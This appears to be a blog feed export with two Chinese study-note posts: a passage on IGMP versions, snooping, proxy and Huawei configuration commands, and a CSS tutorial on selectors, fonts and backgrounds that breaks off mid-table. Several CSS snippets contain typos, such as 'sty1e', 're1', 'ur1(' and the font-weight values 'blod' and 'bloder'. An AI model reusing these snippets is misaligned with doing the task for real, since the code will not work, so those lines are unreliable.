size="3">网络中<b>属于该组播组成员</b>的主机才会进行响应，这样就<b>避免</b>了属于其它组播组成员的主机发送响应报文。</font></div><h2 id="IGMPv2查询器选举"><a href="#IGMPv2查询器选举" class="headerlink" title="IGMPv2查询器选举"></a>IGMPv2查询器选举</h2><div><font size="3">IP地址较小的为查询器<b>（组播中一般优选大的，V2特例）</b>，非查询路由器计时器为<b>125s</b></font></div><div>    <font size="3">选举过程如下：        <ul>            <li>1：所有IGMPv2 路由器在初始时都认为自己是查询器，并向本地网段内的所有主机和路由器发送IGMP 普遍组查询(General Query)报文(目的地址为224.0.0.1);</li>            <li>2：本地网段中的其它IGMPv2 路由器在收到该报文后，将报文的源IP地址与自己的接口地址作比较。通过比较， <b>IP 地址最小的路由器将成为查询器， 其它路由器成为非查询器(Non-Querier);</b></li>            <li>3：所有非查询器上都会启动一个定时器（即其它查询器存在时间定时器Other Querier Present Timer）。在该定时器超时前，如果收到了来自查询器的IGMP 查询报文，则重置该定时器;否则，就认为原查询器失效，并发起新的查询器选举过程。</li>        </ul>    </font></div><h2 id="IGMPv2离组"><a href="#IGMPv2离组" class="headerlink" title="IGMPv2离组"></a>IGMPv2离组</h2><div><font size="3"><p style="text-indent:2em;">任意接收者设备离开组的时候会发送离组消息，目的IP是特定组（RFC为224.0.0.2），查询器（默认）发送<b>两次</b>报文，发送间隔为<b>1S</b>，如果没有其他接收者相应，说明这是最后一个成员，<b>还会再次发送查询，已确定没有其他接收者。</p></b></style></font></div><blockquote><div><font size="3">igmp robust-count 5 （最后一个成员离开后发送的查询次数）</font></div><div><font size="3">igmp prompt-leave （快速离组，不发送最后一个成员离组查询）</font></div></blockquote><div><font size="3"><p style="text-indent:2em;"><b>RFC规定离组报文IP为（224.0.0.2）——>所有子网</b></font></div><blockquote><div><font size="3">华为设备离组报文发往特定组，非224.0.0.2，之后查询器会发送两次针对该组的查询，有接收者回应则继续维护</font></div></blockquote><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220906182842114.png" alt="image-20220906182842114"></p><hr><h2 id="IGMPv3基本概念"><a href="#IGMPv3基本概念" class="headerlink" title="IGMPv3基本概念"></a>IGMPv3基本概念</h2><div>    <font size="3">IGMPv3大部分工作机制与IGMPv2类似：        <ul>            <li>1：查询器选举机制一致：IP地址小的为查询器。</li>            <li>2：使用普遍组查询报文查询组成员加组信息。</li>            <li>3：使用特定组查询报文查询特定组播的成员存活情况。</li>        </ul>    </font></div><div>    <font size="3">IGMPv3需要支持上报组播源信息，与IGMPv2相比IGMPv3的变化如下：        <ul>            <li>1：IGMPv3查询报文除了包含普遍组查询报文和特定组查询报文，还新增了特定源组查询报文（Group-and-Source-Specific Query）。</li>            <li>2：IGMPv3成员关系报告报文不仅包含主机想要加入的组播组，而且包含主机想要接收来自哪些组播源的数据。</li>            <li>3：由于同个组播组的不同成员可能希望接收来自不同源的组播，因此<font color="red"><b>IGMPv3无需成员关系报告报文抑制机制。</b></font></li>            <li>IGMPv3<font color="red"><b>没有定义专门的成员离开报文，</b></font>成员离开通过特定类型的报告报文来传达。</li>        </ul>    </font></div><h2 id="IGMPv3报文格式-–-查询报文"><a href="#IGMPv3报文格式-–-查询报文" class="headerlink" title="IGMPv3报文格式 – 查询报文"></a>IGMPv3报文格式 – 查询报文</h2><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220906183659557.png" alt="image-20220906183659557"></p><div>    <font size="3">IGMPv3的查询报文共有三类：        <ul>            <li><font color="red"><b>1：普遍组查询报文（General Query）。</b></font>该报文作用与IGMPv1,IGMPv2中的普遍组查询报文作用一致。</li>            <li><font color="red"><b>2：特定组查询报文（Group-Specific Query） 。</b></font>该报文作用与IGMPv2中的特定组查询报文作用一致。</li>            <li><font color="red"><b>3：特定源组查询报文（Group-and-Source-Specific Query）。</b></font>该报文用于查询该组成员是否愿意接收特定源发送的数据。特定源组查询通过在报文中携带一个或多个组播源地址来达到这一目的。</li>        </ul>    </font></div><h2 id="IGMPv3报文格式-–-成员关系报告报文"><a href="#IGMPv3报文格式-–-成员关系报告报文" class="headerlink" title="IGMPv3报文格式 – 成员关系报告报文"></a>IGMPv3报文格式 – 成员关系报告报文</h2><div>    <font size="3">IGMPv3成员关系报告报文除了通告组成员的加组信息外，还能通告组成员希望接收的组播源信息。通告组播源主要有两种模式：        <ul>            <li>1：INCLUDE：希望接收来自特定组播源的组播流量</li>            <li>2：EXCLUDE：希望过滤来自特定组播源的组播流量</li>        </ul>    </font></div><h2 id="IGMPv3组成员加组机制"><a href="#IGMPv3组成员加组机制" class="headerlink" title="IGMPv3组成员加组机制"></a>IGMPv3组成员加组机制</h2><div>    <font size="3">IGMPv3组成员加组机制与IGMPv2类似，但有以下不同：        <ul>            <li>1：IGMPv3的成员关系报告报文能够携带组播源信息。</li>            <li>2：IGMPv3成员关系报告报文没有成员关系报告报文抑制机制。</li>        </ul>    </font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220906184405224.png" alt="image-20220906184405224"></p><h2 id="IGMPv3组成员离组机制"><a href="#IGMPv3组成员离组机制" class="headerlink" title="IGMPv3组成员离组机制"></a>IGMPv3组成员离组机制</h2><div><font size="3">IGMPv3没有专门的成员离开报文，成员离开需要借助组成员关系报告实现。</font></div><div><font size="3">IGMP查询器在收到改变源组对应关系的成员关系报告后，会发送特定源组查询报文，确认是否还有组成员存在。</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220906184223555.png" alt="image-20220906184223555"></p><hr><h1 id="IGMP各版本间的差异"><a href="#IGMP各版本间的差异" class="headerlink" title="IGMP各版本间的差异"></a>IGMP各版本间的差异</h1><div>    <table style="borsder:1px solid black;">    <tr style="border:1px solid #000" align="center">        <td style="border:1px solid #000 "><b>机制</b></td>        <td style="border:1px solid #000"><b>IGMPv1</b></td>        <td style="border:1px solid #000"><b>IGMPv2</b></td>        <td style="border:1px solid #000"><b>IGMPv3</b></td>   </tr>        <tr style="border:1px solid #000" align="center">        <td style="border:1px solid #000">查询器选举</td>        <td style="border:1px solid #000">依靠其他协议</td>        <td style="border:1px solid #000">自己选举</td>        <td style="border:1px solid #000">自己选举</td>    </tr>        <tr style="border:1px solid #000" align="center">        <td style="border:1px solid #000">成员离开方式</td>        <td style="border:1px solid #000">静默离开</td>        <td style="border:1px solid #000">主动离开</td>        <td style="border:1px solid #000">主动离开</td>    </tr>        <tr style="border:1px solid #000" align="center">        <td style="border:1px solid #000">特定组查询</td>        <td style="border:1px solid #000">不支持</td>        <td style="border:1px solid #000">支持</td>        <td style="border:1px solid #000">支持</td>    </tr>        <tr style="border:1px solid #000" align="center">        <td style="border:1px solid #000">指定源、组</td>        <td style="border:1px solid #000">不支持</td>        <td style="border:1px solid #000">不支持</td>        <td style="border:1px solid #000">支持</td>    </tr>        <tr style="border:1px solid #000" align="center">        <td style="border:1px solid #000">版本兼容性</td>        <td style="border:1px solid #000"></td>        <td style="border:1px solid #000">IGMPv1</td>        <td style="border:1px solid #000">IGMPv1、IGMPv2</td>    </tr>   </table> </div><hr><h1 id="以太网（三层）的组播转发问题"><a href="#以太网（三层）的组播转发问题" class="headerlink" title="以太网（三层）的组播转发问题"></a>以太网（三层）的组播转发问题</h1><div><font size="3">当组播数据从最后一跳路由器发往组播组成员时，往往会经过交换机。由于组播数据的目的MAC地址是组播MAC地址，默认情况下交换机将泛洪此类数据帧，有可能导致不同组的组播流量会被别组的成员接收。</font></div><div><font size="3">IGMP Snooping功能可以控制组播流量在以太网的泛洪范围，避免不同组的组播流量被别组成员接收。</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220906185843682.png" alt="image-20220906185843682"></p><hr><h1 id="IGMP-Snooping"><a href="#IGMP-Snooping" class="headerlink" title="IGMP Snooping"></a>IGMP Snooping</h1><div><font size="3">解决组播报文在<b>二层广播</b>的问题。</font></div><div><font size="3">运行在<b>链路层</b>，是二层以太网交换机上的组播约束机制，用于<b>管理</b>和<b>控制</b>组播组。</font></div><div><font size="3">通过监听主机发出的IGMP报文，<b>建立组播MAC地址表</b>。</font></div><blockquote><div><font size="3">igmp snooping enable（全局开启）</font></div><div><font size="3">igmp snooping enable vlan 10 （针对某个Vlan进行使能）</font></div></blockquote><h2 id="IGMP-Snooping端口"><a href="#IGMP-Snooping端口" class="headerlink" title="IGMP Snooping端口"></a>IGMP Snooping端口</h2><div><font size="3">二层组播转发表项中存在<b>两类接口</b>：</font></div><div><font size="3"><b>路由器端口（Router Port）</b>：二层组播设备上，朝向三层组播设备（DR或IGMP查询器）一侧的接口，二层组播设备从此接口接收组播数据报文。</font></div><div><font size="3"><b>成员端口（Member Port）</b>：又称组播组成员端口，表示二层组播设备上，朝向组播组成员一侧的端口，二层组播设备往此接口发送组播数据报文。</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220906190203372.png" alt="image-20220906190203372"></p><h2 id="IGMP-Snooping工作原理-–-形成转发表项"><a href="#IGMP-Snooping工作原理-–-形成转发表项" class="headerlink" title="IGMP Snooping工作原理 – 形成转发表项"></a>IGMP Snooping工作原理 – 形成转发表项</h2><div><font size="3">IGMP Snooping设备通过监听IGMP报文，形成二层组播转发表，并决定接口类型，具体过程如下：</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220906190323050.png" alt="image-20220906190323050"></p><h2 id="IGMP-Snooping工作原理-–-维护转发表项"><a href="#IGMP-Snooping工作原理-–-维护转发表项" class="headerlink" title="IGMP Snooping工作原理 – 维护转发表项"></a>IGMP Snooping工作原理 – 维护转发表项</h2><div><font size="3">IGMP Snooping设备通过监听IGMP离开报文，IGMP成员关系报告报文决定特定端口是否还需要发送特定组播，具体过程如下：</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220906190419268.png" alt="image-20220906190419268"></p><hr><h1 id="IGMP-Proxy介绍"><a href="#IGMP-Proxy介绍" class="headerlink" title="IGMP Proxy介绍"></a>IGMP Proxy介绍</h1><div><font size="3">    <ul>        <li>现网中可能存在一台IGMP查询器需要管理大量组成员的情况，大量成员主机频繁加入/离开组播组时，会产生大量的IGMP成员关系报告/离开报文，从而给IGMP查询器带来较大的处理压力。</li>        <li>通过IGMP Proxy功能可减少IGMP查询器接收IGMP成员关系报告/离开报文的数量，减轻IGMP查询器压力。</li>        <li>IGMP Proxy通常被部署在IGMP查询器和成员主机之间的三层设备上。</li>    </ul></font></div><h2 id="IGMP-Proxy基本概念"><a href="#IGMP-Proxy基本概念" class="headerlink" title="IGMP Proxy基本概念"></a>IGMP Proxy基本概念</h2><div><font size="3">    <ul>        <li>为了缓解IGMP查询器压力，IGMP Proxy设备将成员关系报告/离开报文汇聚后统一上送给IGMP查询器。</li>        <li>IGMP Proxy设备也可以代理IGMP查询器向成员主机发送查询报文，维护组成员关系，基于组成员关系进行组播转发。</li>        <li>为了实现以上功能，IGMP Proxy定义了两类接口：</li>        <ul>            <li><font color="red">主机接口（Host Interface）：</font>IGMP Proxy设备上配置IGMP Proxy功能的接口，该接口一般面向IGMP查询器。</li>            <li><font color="red">路由器接口（Router Interface）：</font>IGMP Proxy设备上配置IGMP功能的接口，该接口一般面向组成员。</li>        </ul>    </ul></font></div><h2 id="IGMP-Proxy工作机制-–-成员加组"><a href="#IGMP-Proxy工作机制-–-成员加组" class="headerlink" title="IGMP Proxy工作机制 – 成员加组"></a>IGMP Proxy工作机制 – 成员加组</h2><div><font size="3">    <ul>        <li>IGMP Proxy减少成员关系报告报文的工作机制如下：</li>        <li>路由器接口作为IGMP接口，对下呈现为IGMP查询器，发送查询报文，处理成员关系报告报文，形成IGMP表项，并将成员关系报告<font color="red">从主机接口发送给上游的IGMP查询器。</font></li>        <li>当新用户<font color="red">加入同一个组播组时</font>，IGMP Proxy设备<font color="red">不会再向IGMP查询器反馈成员关系报告报文</font>，因此减少了成员关系报告报文数量。</li>    </ul></font></div><h2 id="IGMP-Proxy工作机制-–-成员离组"><a href="#IGMP-Proxy工作机制-–-成员离组" class="headerlink" title="IGMP Proxy工作机制 – 成员离组"></a>IGMP Proxy工作机制 – 成员离组</h2><div><font size="3">当组成员离开时，IGMP Proxy通过IGMP离组机制确定是否有特定组播组的组成员，当<font color="red">确定已经没有组成员</font>后才<font color="red">发送离开报文给上游IGMP查询器。</font></font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/zubo/image-20220906191154201.png" alt="image-20220906191154201"></p><hr><h1 id="IGMP协议的基本配置"><a href="#IGMP协议的基本配置" class="headerlink" title="IGMP协议的基本配置"></a>IGMP协议的基本配置</h1><div><font size="4"><b>使能IGMP功能</b></font></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Huawei - GigabitEthernet1/0/0] igmp enable</span><br></pre></td></tr></table></figure><div><font size="4"><b>配置IGMP版本</b></font></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Huawei - GigabitEthernet1/0/0] igmp version number</span><br></pre></td></tr></table></figure><div><font size="4"><b>全局使能IGMP snopping功能</b></font></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Huawei ]igmp-snooping enable</span><br></pre></td></tr></table></figure><div><font size="4"><b>VLAN下使能IGMP代理功能</b></font></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Huawei-vlan10] igmp-snooping proxy</span><br></pre></td></tr></table></figure><div><font size="4"><b>在接口下使能IGMP SSM Mapping</b></font></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Huawei - GigabitEthernet1/0/0] igmp ssm-mapping enable</span><br></pre></td></tr></table></figure><div><font size="4"><b>在IGMP视图下配置静态SSM映射关系</b></font></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Huawei-igmp] ssm-mapping group-address group-mask source-address</span><br></pre></td></tr></table></figure><div><font size="4"><b>查看接口的IGMP配置和运行信息</b></font></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Huawei&gt;display igmp interface</span><br></pre></td></tr></table></figure><div><font size="4"><b>查看加入组播组的成员信息</b></font></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Huawei&gt;display igmp group</span><br></pre></td></tr></table></figure><div><font size="4"><b>查看二层组播转发表</b></font></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Huawei&gt;display l2-multicast forwarding-table vlan vlan-id</span><br></pre></td></tr></table></figure><div><font size="4"><b>查看IGMP SSM Mapping静态映射关系</b></font></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Huawei&gt;display igmp ssm-mapping</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 组播 </tag>
            
            <tag> IGMP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS学习笔记</title>
      <link href="/posts/948e1c93/"/>
      <url>/posts/948e1c93/</url>
      
        <content type="html"><![CDATA[<h1 id="CSS简介"><a href="#CSS简介" class="headerlink" title="CSS简介"></a>CSS简介</h1><h2 id="CSS概念"><a href="#CSS概念" class="headerlink" title="CSS概念"></a>CSS概念</h2><p>​        CSS（Cascading Style Sheets）层叠样式表，又叫级联样式表，简称样式表</p><p>​        CSS后缀名为.css</p><p>​        CSS用于HTML文档中元素样式的定义</p><div style="font-size:20px;"><b>为什么需要CSS</b></div><p>​        CSS的唯一目的就是让网页变得美观</p><div style="font-size:20px;"><b>语法</b></div><p>​        CSS规则由两个主要的部分构成：选择器，以及一条或多条声明（样式）</p><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/webstudy/1.jpg" alt="1"></p><p>​        选择器通常是您需要改变样式的HTML元素</p><p>​        每条声明由一个属性和一个值组成</p><p>​        属性(property)是您希望设置的样式属性(styleattribute)。每个属性有一个值。属性和值被冒号分开</p><hr><h1 id="CSS的引入方式"><a href="#CSS的引入方式" class="headerlink" title="CSS的引入方式"></a>CSS的引入方式</h1><h2 id="内联样式-行内样式"><a href="#内联样式-行内样式" class="headerlink" title="内联样式(行内样式)"></a>内联样式(行内样式)</h2><p>要使用内联样式，你需要在相关的标签内使用样式(style)属性。Style属性可以包含任何CSS属性</p><div class="note success no-icon flat"><p>Tips：缺乏整体性和规划性，不利于维护，维护成本高</p></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">sty1e</span>=<span class="string">&quot;background: orange; font-size: 24px; &quot;</span>&gt;</span>css<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="内部样式"><a href="#内部样式" class="headerlink" title="内部样式"></a>内部样式</h2><p>当单个文档需要特殊的样式时，就应该使用内部样式表。你可以使用 <code>&lt;style&gt;</code> 标签在文档头部定义内部样式表</p><div class="note success no-icon flat"><p>Tips：单个页面内的CSS代码具有统一性和规划性，便于维护，但是在多个页面之间容易混乱</p></div><h2 id="外部样式-推荐"><a href="#外部样式-推荐" class="headerlink" title="外部样式(推荐)"></a>外部样式(推荐)</h2><p>当样式需要应用于很多页面时，外部样式表将是理想的选择。</p><p>在使用外部样式表的情况下，你可以通过改变一个文件来改变整个站点的外观。</p><p>每个页面使用 <code>&lt;link&gt;</code> 标签链接到样式表。<link>标签在（文档的）头部</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">re1</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;xxx.css &quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h1 id="CSS的选择器"><a href="#CSS的选择器" class="headerlink" title="CSS的选择器"></a>CSS的选择器</h1><h2 id="CSS选择器一"><a href="#CSS选择器一" class="headerlink" title="CSS选择器一"></a>CSS选择器一</h2><div style="font-size:20px;"><b>全局选择器</b></div><p>可以与任何元素匹配，优先级最低，一般做样式初始化</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*&#123;</span><br><span class="line"><span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div style="font-size:20px;"><b>元素选择器</b></div><p>HTML文档中的元素，<strong>p</strong>、 <strong>b</strong>、<strong>div</strong>、<strong>a</strong>、<strong>img</strong>、<strong>body</strong>等。</p><p>标签选择器，选择的是页面上所有这种类型的标签，所以经常描述”共性”，无法描述某一个元素的“个性””</p><p>再比如说，我想让学完前端，继续学Java”这句话中的“前端”两个变为红色字体</p><p>那么我可以用 <code>&lt;span&gt;</code> 标签把“前端”这两个字围起来，然后给 <code>&lt;span&gt;</code> 标签加一个标签选择器</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">span&#123;</span><br><span class="line">color: red;4 </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>学完了<span class="tag">&lt;<span class="name">span</span>&gt;</span>前端<span class="tag">&lt;/<span class="name">span</span>&gt;</span>，继续学Java<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><div class="note success no-icon flat"><p>Tips：所有的标签，都可以是选择器。比如ul、li、label、dt、dl、input、div等</p><p>无论这个标签藏的多深，一定能够被选择上，选择的所有，而不是一个。</p></div><div style="font-size:20px;"><b>类选择器</b></div><p>规定用圆点 <code>.</code> 来定义，针对你想要的所有标签使用</p><p>优点—-&gt;灵活</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/*定义类选择器*/</span><br><span class="line">.oneclass&#123;</span><br><span class="line">width : 800px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;oneclass&quot;</span>&gt;</span>你好<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure><div class="note success no-icon flat"><p>Tips：class属性的特点：类选择器可以被多种标签使用类名不能以数字开头</p><p>同一个标签可以使用多个类选择器。用空格隔开。</p></div><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">&quot;classone classtwo&quot;</span>&gt;</span>我是一个h3啊<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">&quot;teshu&quot;</span> <span class="attr">class</span>=<span class="string">&quot;zhongyao&quot;</span>&gt;</span>我是一个h3啊<span class="tag">&lt;/<span class="name">h3</span>&gt;</span>   //错误</span><br></pre></td></tr></table></figure><h2 id="CSS选择器二"><a href="#CSS选择器二" class="headerlink" title="CSS选择器二"></a>CSS选择器二</h2><div style="font-size:20px;"><b>ID选择器</b></div><p>针对某一个特定的标签来使用，只能使用一次。css 中的ID选择器以 <code>#</code> 来定义</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#mytitle&#123;</span><br><span class="line">border : 3px dashed green;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;mytitle&quot;</span>&gt;</span>你好<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure><div class="note success no-icon flat"><p>特别强调：ID是唯一的、ID不能以数字开头</p></div><div style="font-size:20px;"><b>合并选择器</b></div><p>语法：选择器1,选择器2…{ }</p><p>作用：提取共同的样式，减少重复代码</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.header</span>,<span class="selector-class">.footer</span>&#123;</span><br><span class="line"><span class="attribute">height</span> : <span class="number">300px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div style="font-size:20px;"><b>选择器的优先级CSS中，权重用数字衡量</b></div><div class='checkbox checked'><input type="radio" checked="checked"/>            <p>元素选择器的权重为：1</p>            </div><div class='checkbox checked'><input type="radio" checked="checked"/>            <p>class选择器的权重为: 10</p>            </div><div class='checkbox checked'><input type="radio" checked="checked"/>            <p>id选择器的权重为: 100</p>            </div><div class='checkbox checked'><input type="radio" checked="checked"/>            <p>内联样式的权重为:1000</p>            </div><hr><h1 id="CSS字体属性颜色、大小、粗细"><a href="#CSS字体属性颜色、大小、粗细" class="headerlink" title="CSS字体属性颜色、大小、粗细"></a>CSS字体属性颜色、大小、粗细</h1><h2 id="font-weight"><a href="#font-weight" class="headerlink" title="font-weight"></a>font-weight</h2><div class="table-container"><table><thead><tr><th style="text-align:center">值</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">blod</td><td style="text-align:center">定义粗体字符</td></tr><tr><td style="text-align:center">bloder</td><td style="text-align:center">定义更粗字符</td></tr><tr><td style="text-align:center">lighter</td><td style="text-align:center">定义更细字符</td></tr><tr><td style="text-align:center">100-900</td><td style="text-align:center">定义由细到粗 400等同默认  700等同blod</td></tr></tbody></table></div><h2 id="font-style"><a href="#font-style" class="headerlink" title="font-style"></a>font-style</h2><p>指定文本的样式</p><div class="table-container"><table><thead><tr><th style="text-align:center">值</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">normal</td><td style="text-align:center">默认值</td></tr><tr><td style="text-align:center">italic</td><td style="text-align:center">定义斜体字</td></tr></tbody></table></div><h2 id="font-family"><a href="#font-family" class="headerlink" title="font-family"></a>font-family</h2><p>指定一个元素的字体</p><div class="note success no-icon flat"><p>每个值用逗号分开，如果字体名称包含空格，它必须加上引号</p></div><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">font-family</span>:<span class="string">&quot;微软雅黑&quot;</span></span><br></pre></td></tr></table></figure><hr><h1 id="CSS背景属性"><a href="#CSS背景属性" class="headerlink" title="CSS背景属性"></a>CSS背景属性</h1><div class="table-container"><table><thead><tr><th style="text-align:center">属性</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">background-color</td><td style="text-align:center">设置背景颜色</td></tr><tr><td style="text-align:center">background-image</td><td style="text-align:center">设置背景图片</td></tr><tr><td style="text-align:center">background-position</td><td style="text-align:center">设置背景图片显示位置</td></tr><tr><td style="text-align:center">background-repeat</td><td style="text-align:center">设置背景图片如何填充</td></tr><tr><td style="text-align:center">background-size</td><td style="text-align:center">设置背景图片大小属性</td></tr></tbody></table></div><h2 id="background-color属性"><a href="#background-color属性" class="headerlink" title="background-color属性"></a>background-color属性</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">div</span> class=&quot;box&quot;&gt;&lt;/<span class="selector-tag">div</span>&gt;</span><br><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line"><span class="attribute">width</span>:<span class="number">300px</span>;</span><br><span class="line"><span class="attribute">height</span>:<span class="number">300px</span>;</span><br><span class="line"><span class="attribute">background-color</span>:red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="background-image属性"><a href="#background-image属性" class="headerlink" title="background-image属性"></a>background-image属性</h2><p>设置元素的背景图像</p><p>元素的背景是元素的总大小，包括填充和边界(不包括外边距)。默认情况下background-image属性放置在元素的左上角</p><p>如果图像不够大的话会在垂直和水平方向平铺图像，如果图像大小超过元素大小从图像的左上角显示元素大小的那部分</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">div</span> class=&quot;box&quot;&gt;&lt;/<span class="selector-tag">div</span>&gt;</span><br><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">600px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">600px</span>;</span><br><span class="line"><span class="attribute">background-image</span>: <span class="built_in">ur1</span>( <span class="string">&quot;images/img1.jpg&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="background-repeat属性"><a href="#background-repeat属性" class="headerlink" title="background-repeat属性"></a>background-repeat属性</h2><p>该属性设置如何平铺背景图像</p><div class="table-container"><table><thead><tr><th style="text-align:center">值</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">repeat</td><td style="text-align:center">默认值</td></tr><tr><td style="text-align:center">repeat-x</td><td style="text-align:center">只向水平方向平铺</td></tr><tr><td style="text-align:center">repeat-y</td><td style="text-align:center">只向垂直方向平铺</td></tr><tr><td style="text-align:center">no-repeat</td><td style="text-align:center">不平铺</td></tr></tbody></table></div><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span>&#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">600px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">600px</span>;</span><br><span class="line"><span class="attribute">background-color</span>: <span class="number">#fcc</span>;</span><br><span class="line"><span class="attribute">background-image</span>: <span class="built_in">ur1</span>( <span class="string">&quot;images/img1.jpg&quot;</span> );</span><br><span class="line"><span class="attribute">background-repeat</span>: no-repeat;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="background-size属性"><a href="#background-size属性" class="headerlink" title="background-size属性"></a>background-size属性</h2><p>该属性设置背景图像的大小</p><div class="table-container"><table><thead><tr><th style="text-align:center">值</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">length</td><td style="text-align:center">设置背景图片的宽度和高度，第一个值宽度，第二个值高度，如果只是设置一个，第二个值auto</td></tr><tr><td style="text-align:center">percentage</td><td 